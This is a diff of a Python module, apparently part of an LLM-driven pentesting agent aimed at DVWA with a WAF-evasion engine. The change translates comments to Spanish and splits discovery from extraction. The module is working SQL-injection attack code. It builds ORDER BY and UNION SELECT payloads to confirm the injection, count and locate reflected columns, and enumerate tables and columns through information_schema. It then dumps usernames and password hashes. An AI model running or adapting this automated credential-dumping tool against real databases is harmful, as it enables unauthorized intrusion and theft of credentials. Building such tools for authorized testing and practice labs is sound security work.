@@ -1,13 +1,14 @@
-"""Schema discovery: the agent FINDS the table and columns instead of assuming them, so it works
-on targets where the schema is not the hardcoded `users(user, password)`.
+"""Descubrimiento de esquema para SQL injection.
 
-This is almost entirely DETERMINISTIC, which is what makes a small local model viable: the model is
-only (optionally) asked to pick which of the discovered columns hold the credentials — everything
-else is driven by the database's own answers (error messages, reflected markers, information_schema).
+El agente AVERIGUA la estructura de la base de datos enviando consultas y leyendo las respuestas —
+nunca asume la tabla ni las columnas. Es el mismo procedimiento de un pentester (o de sqlmap):
+confirmar la inyección, aprender cuántas columnas hay, enumerar el esquema desde information_schema
+y recién ahí extraer. La mecánica es determinista para que un modelo local pequeño sea fiable; la
+única decisión que queda para el LLM es cuáles de las columnas descubiertas son las credenciales.
 
-It talks to the outside world through one callback, `probe(sql) -> ProbeResult`, which sends a base
-injection and returns the reflected cell values. The caller wires `probe` to the evasion engine +
-target, so discovery stays independent of DVWA specifics."""
+Habla con el exterior por un solo callback, `probe(sql) -> ProbeResult`, que envía una inyección
+base y devuelve los valores reflejados. Quien lo usa conecta `probe` al motor de evasión + objetivo,
+así el descubrimiento no depende de DVWA en concreto."""
 from __future__ import annotations
 
 from dataclasses import dataclass, field
@@ -20,12 +21,12 @@ _MAX_COLUMNS = 12
 
 @dataclass
 class ProbeResult:
-    """Result of sending one base injection. `cells` rows list the values shown in the REFLECTED
-    columns, in order (cells[r][0] = value in the first reflected slot)."""
+    """Resultado de enviar una inyección base. `cells` son las filas con los valores que se ven en
+    las columnas REFLEJADAS, en orden (cells[f][0] = valor de la primera posición reflejada)."""
 
     cells: list[list[str]] = field(default_factory=list)
     db_error: bool = False
-    blocked: bool = False  # the WAF could not be bypassed for this probe
+    blocked: bool = False  # el WAF no se pudo evadir para esta prueba
 
 
 @dataclass
@@ -43,18 +44,17 @@ class DiscoveryResult:
 
 
 Probe = Callable[[str], ProbeResult]
-# (table, columns) -> (user_column, pass_column) or None if undecided
 Picker = Callable[[str, list[str]], Optional[tuple[str, str]]]
 
 
 def _hexlit(s: str) -> str:
-    """MySQL hex literal for a string, e.g. 'users' -> 0x7573657273 (avoids needing quotes)."""
+    """Literal hexadecimal de MySQL, p. ej. 'users' -> 0x7573657273 (evita tener que usar comillas)."""
     return "0x" + s.encode("utf-8").hex()
 
 
 def _best_match(columns: list[str], hints: tuple[str, ...]) -> str:
-    """Prefer an exact hint match (e.g. `user`), then a hint substring that is not an id column
-    (so `user` beats `user_id`)."""
+    """Prefiere una coincidencia exacta (p. ej. `user`), luego una subcadena que no sea columna id
+    (así `user` gana a `user_id`)."""
     for c in columns:
         if c.lower() in hints:
             return c
@@ -66,7 +66,7 @@ def _best_match(columns: list[str], hints: tuple[str, ...]) -> str:
 
 
 def pick_credential_columns(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
-    """Deterministic fallback for the one judgement call: which columns are user & password."""
+    """Respaldo determinista para la única decisión: cuáles son usuario y contraseña."""
     user_col = _best_match(columns, _USER_HINTS)
     pass_col = _best_match(columns, _PASS_HINTS)
     if user_col and pass_col and user_col != pass_col:
@@ -75,88 +75,103 @@ def pick_credential_columns(table: str, columns: list[str]) -> Optional[tuple[st
 
 
 class SchemaDiscovery:
-    def __init__(self, probe: Probe, pick: Picker = pick_credential_columns) -> None:
+    def __init__(self, probe: Probe, say: Optional[Callable[[str], None]] = None,
+                 pick: Picker = pick_credential_columns) -> None:
         self.probe = probe
+        self.say = say or (lambda _m: None)
         self.pick = pick
 
-    def run(self) -> DiscoveryResult:
+    def discover(self) -> DiscoveryResult:
+        """Averigua comillas, nº de columnas, columnas reflejadas, tablas y columnas de credenciales."""
         res = DiscoveryResult()
 
-        # 1. Confirm injection and detect the quote context (string ' vs integer).
+        # 1+2. Confirmar la inyección y contar columnas, probando contexto de cadena y luego entero.
         for quote in ("'", ""):
-            r = self.probe(f"1{quote}")
-            if r.blocked:
-                continue
-            if r.db_error:
-                res.injectable, res.quote = True, quote
+            first = self.probe(f"1{quote} ORDER BY 1-- -")
+            if first.blocked or first.db_error:
+                continue  # en el contexto correcto, ORDER BY 1 debe ser válido
+            cols = _MAX_COLUMNS
+            for n in range(2, _MAX_COLUMNS + 1):
+                r = self.probe(f"1{quote} ORDER BY {n}-- -")
+                if r.blocked:
+                    cols = n - 1
+                    break
+                if r.db_error:
+                    cols = n - 1
+                    break
+            if cols >= 1:
+                res.injectable, res.quote, res.columns = True, quote, cols
                 break
-        res.trace.append(f"inject: injectable={res.injectable} quote={res.quote!r}")
+        res.trace.append(f"inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns}")
+        self.say(f"[Descubrimiento] inyectable={res.injectable} comillas={res.quote!r} columnas={res.columns}")
         if not res.injectable:
             return res
-        q = res.quote
 
-        # 2. Count columns with an ORDER BY ramp (stop when the DB complains).
-        for n in range(1, _MAX_COLUMNS + 1):
-            r = self.probe(f"1{q} ORDER BY {n}-- -")
-            if r.blocked:
-                break
-            if r.db_error:
-                res.columns = n - 1
-                break
-        res.trace.append(f"columns: {res.columns}")
-        if res.columns < 1:
-            return res
-
-        # 3. Find which columns are echoed back, using unique numeric sentinels.
+        # 3. Qué columnas se reflejan en la página (con marcadores numéricos únicos).
         sentinels = [str(1000 + i) for i in range(res.columns)]
-        r = self.probe(f"-1{q} UNION SELECT {','.join(sentinels)}-- -")
+        r = self.probe(f"-1{res.quote} UNION SELECT {','.join(sentinels)}-- -")
         flat = {c for row in r.cells for c in row}
         res.reflected = [i for i, s in enumerate(sentinels, start=1) if s in flat]
-        res.trace.append(f"reflected columns: {res.reflected}")
+        res.trace.append(f"columnas reflejadas={res.reflected}")
+        self.say(f"[Descubrimiento] columnas reflejadas={res.reflected}")
         if not res.reflected:
             return res
 
-        # 4. Enumerate the tables in the current database.
-        res.tables = self._probe_col0(self._union_single(res, "table_name",
+        # 4. Enumerar las tablas de la base de datos actual.
+        res.tables = self._col0(self._single(res, "table_name",
             " FROM information_schema.tables WHERE table_schema=database()"))
-        res.trace.append(f"tables: {res.tables}")
+        res.trace.append(f"tablas={res.tables}")
+        self.say(f"[Descubrimiento] tablas={res.tables}")
 
-        # 5. For each table, read its columns and ask whether they hold credentials.
+        # 5. Por cada tabla, leer sus columnas y decidir si tiene credenciales.
         for table in res.tables or [""]:
-            cols = self._probe_col0(self._union_single(res, "column_name",
+            cols = self._col0(self._single(res, "column_name",
                 f" FROM information_schema.columns WHERE table_name={_hexlit(table)}")) if table else []
             picked = self.pick(table, cols)
-            res.trace.append(f"columns of {table!r}: {cols} -> creds={picked}")
+            res.trace.append(f"columnas de {table!r}={cols} -> credenciales={picked}")
+            self.say(f"[Descubrimiento] columnas de {table!r}={cols} -> credenciales={picked}")
             if picked:
                 res.target_table, res.cred_columns = table, picked
                 break
-        if not res.cred_columns[0]:
-            return res
-
-        # 6. Dump the chosen columns.
-        user_col, pass_col = res.cred_columns
-        payload = self._union_pair(res, user_col, pass_col, f" FROM {res.target_table}")
-        res.final_payload = payload
-        r = self.probe(payload)
-        res.extracted = [{"username": row[0], "hash": row[1]} for row in r.cells if len(row) >= 2]
-        res.trace.append(f"dumped {len(res.extracted)} rows via {payload!r}")
         return res
 
-    # --- payload builders: put our expression(s) at the reflected position(s), fillers elsewhere ---
+    def build_dump_payload(self, res: DiscoveryResult) -> str:
+        """Construye (de forma determinista) el payload de extracción desde el esquema descubierto."""
+        user_col, pass_col = res.cred_columns
+        return self._pair(res, user_col, pass_col, f" FROM {res.target_table}")
 
-    def _union_single(self, res: DiscoveryResult, expr: str, from_clause: str = "") -> str:
+    def extract(self, payload: str, res: DiscoveryResult) -> list[dict[str, str]]:
+        """Envía el payload de extracción y devuelve las filas (usuario, hash)."""
+        r = self.probe(payload)
+        rows = [{"username": row[0], "hash": row[1]} for row in r.cells if len(row) >= 2]
+        res.final_payload = payload
+        res.extracted = rows
+        res.trace.append(f"extraidas {len(rows)} filas con {payload!r}")
+        self.say(f"[Descubrimiento] extraidas {len(rows)} filas")
+        return rows
+
+    def run(self) -> DiscoveryResult:
+        """Descubre y extrae en una pasada (útil para pruebas y uso directo)."""
+        res = self.discover()
+        if res.cred_columns[0]:
+            self.extract(self.build_dump_payload(res), res)
+        return res
+
+    # --- constructores de payload: ponen la(s) expresión(es) en la(s) posición(es) reflejada(s) ---
+
+    def _single(self, res: DiscoveryResult, expr: str, from_clause: str = "") -> str:
         pos = res.reflected[0]
         slots = [expr if i == pos else str(i) for i in range(1, res.columns + 1)]
         return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"
 
-    def _union_pair(self, res: DiscoveryResult, e1: str, e2: str, from_clause: str = "") -> str:
-        p1, p2 = res.reflected[0], res.reflected[1] if len(res.reflected) > 1 else res.reflected[0]
+    def _pair(self, res: DiscoveryResult, e1: str, e2: str, from_clause: str = "") -> str:
+        p1 = res.reflected[0]
+        p2 = res.reflected[1] if len(res.reflected) > 1 else res.reflected[0]
         slots = []
         for i in range(1, res.columns + 1):
             slots.append(e1 if i == p1 else e2 if i == p2 else str(i))
         return f"-1{res.quote} UNION SELECT {','.join(slots)}{from_clause}-- -"
 
-    def _probe_col0(self, payload: str) -> list[str]:
-        """Send a single-value UNION and read the first reflected column of every row."""
+    def _col0(self, payload: str) -> list[str]:
         r = self.probe(payload)
         return [row[0] for row in r.cells if row]
